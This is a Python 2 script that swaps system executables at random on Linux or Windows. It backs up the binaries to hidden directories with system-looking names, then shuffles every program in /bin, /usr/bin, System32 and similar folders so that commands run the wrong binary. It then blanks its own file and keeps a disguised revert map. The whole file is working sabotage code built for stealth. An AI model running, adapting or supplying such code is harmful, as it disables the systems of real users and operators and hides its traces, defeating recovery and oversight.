#!/usr/bin/env python
from sys import exit, argv
import platform
import os
from random import choice
import itertools
from multiprocessing import Process
import pickle
import shutil

#TODO:
# 1. figure out what binaries are needed to login successfully so we don't swap those.

operatingSystem = platform.system().lower() #detect OS

if operatingSystem == "windows": #set up some vars for specific OSes
	slash = "\\"
	dest = "C:\\Windows\\bin_locale"
	backfile = "C:\Windows\Globalization\Global.nls"
else:
	slash = "/"
	dest = "/lib/lib-udev"
	backfile = "/var/local/opt"

#swap two given values in a list
def swap(xs, a, b):
    xs[a], xs[b] = xs[b], xs[a]

#find one derangement of the given list, xs
def derange(xs):
	for a in xrange(1, len(xs)):
		b = choice(xrange(0, a))
		swap(xs, a, b)

#shuffle binaries
def shuffle(keys, oldDict, newDict):
	for key in keys:
		shutil.move(dest + oldDict[key], newDict[key])

#put the binaries back to where they should be
def unshuffle(oldDict, newDict):
	for key in newDict.keys():
		shutil.move(dest + newDict[key], oldDict[key])

#backup the binary files
def backup(myDict, directories, revert=0):
	cmd = ""
	if operatingSystem == "windows":
		mkdirBin = "mkdir"
	else: #linux!
		if revert:
			mkdirBin = "/var/mkdir"
		else: #if we're not reverting, make backups of python and mkdir
			cmd = ("/bin/cp `which mkdir` /var/mkdir;"
				   "/bin/cp `which python` /var/spool/python;")
			mkdirBin = "/usr/bin/env mkdir"

	cmd = cmd + "%s -p \"%s\";" % (mkdirBin, dest) #create initial backup dir

	for myDir in directories: #remake directory structure
		cmd = cmd + "%s -p \"%s%s\";" % (mkdirBin, dest, myDir)
		
	os.system(cmd) #create directories needed

	#should work cross platform
	for key, value in myDict.iteritems(): #backup the actual binaries
		shutil.copy(value, dest + value)

#get all files from the directories given and place them in a dictionary
def getFiles(directories):
	myDict = {}
	for myDir in directories: #traverse given dirs
		if os.path.isdir(myDir): #if dir exists traverse files in it
			for myBin in os.listdir(myDir):
				#if windows
				if operatingSystem == "windows":
					#if not an executable or if cmd or python, skip it
					if myBin[-4:] != ".exe" or myBin == "cmd.exe" or "python" in myBin:
						continue
				#if linux
				else: #if a shell, env or python, skip it
					if (myBin == "sh" or myBin == "bash" or myBin == "csh" or myBin == "zsh"
						or myBin == "env" or myBin == "tcsh" or myBin == "dash"
						or myBin == "ash" or "python" in myBin):
						continue

				fullBin = "%s%s%s" % (myDir, slash, myBin)
				if os.path.isfile(fullBin): #make sure it's a file not a dir
					myDict[myBin] = fullBin
				#not tested, but this should recurse through all directories which would be useful
				#for the "Program Files" directory. should look into this.
				#elif operatingSystem == "windows":
				#	return getFiles([myBin])

	return myDict

#main binary swapping function
def binswap():
	#pick directories based on OS
	if operatingSystem == "windows":
		dirs = ["C:\Windows", "C:\Windows\System32"]
	else:
		dirs = ["/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin"]

	#get the files into two dictionaries
	oldDict = getFiles(dirs)

	#create backups of all the binaries so we can copy things properly during the shuffle
	backupThread = Process(target=backup, args=(oldDict,dirs,))
	backupThread.start()

	newDict = oldDict.copy()

	#get two lists of keys, the second is a derangement of the first
	oldKeys = oldDict.keys()
	newKeys = list(oldKeys)
	derange(newKeys)

	#shuffle the key:value pairs
	for oldKey, newKey in zip(oldKeys, newKeys):
		newDict[newKey] = oldDict[oldKey]

	#wait till thread is done, if it worked then shuffle the actual binares on the system
	backupThread.join()
	if backupThread.exitcode == 0:
		shuffleThread = Process(target=shuffle, args=(newKeys, oldDict, newDict,))
		shuffleThread.start()
	else:
		print "backing up failed. exiting..."
		return(backupThread.exitcode)

	#prepare for revert
	with open(backfile, 'wb') as outfile:
		pickle.dump([oldDict, newDict], outfile)

	shuffleThread.join() #wait for shuffling to finish before ending
	os.system("echo > %s" % argv[0]) #self erase
	print "done swapping"
	return 0

#revert binaries back to original
def revert():
	#pick directories based on OS
	if operatingSystem == "windows":
		dirs = ["C:\Windows", ""]
	else:
		dirs = ["/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin"]

	#grab oldDict and newDict from file
	if os.path.exists(backfile):
		with open(backfile, 'rb') as infile:
			oldDict, newDict = pickle.load(infile)
	else:
		print "cannot find backup files, ya screwed"
		return 1

	#create copies of the binaries then put them back in the right place
	backup(oldDict, dirs, revert=1)
	unshuffle(oldDict, newDict)

	print "done reverting"
	return 0

if __name__ == "__main__":
	if len(argv) > 1: #check the arg if we have any
		if argv[1] == "-r" or argv[1] == "--revert" or argv[1] == "revert" or argv[1] == "-revert":
			exit(revert())
		else: #if arg didn't match, swap away!
			exit(binswap())
	else: #if no args, just swap!
		exit(binswap())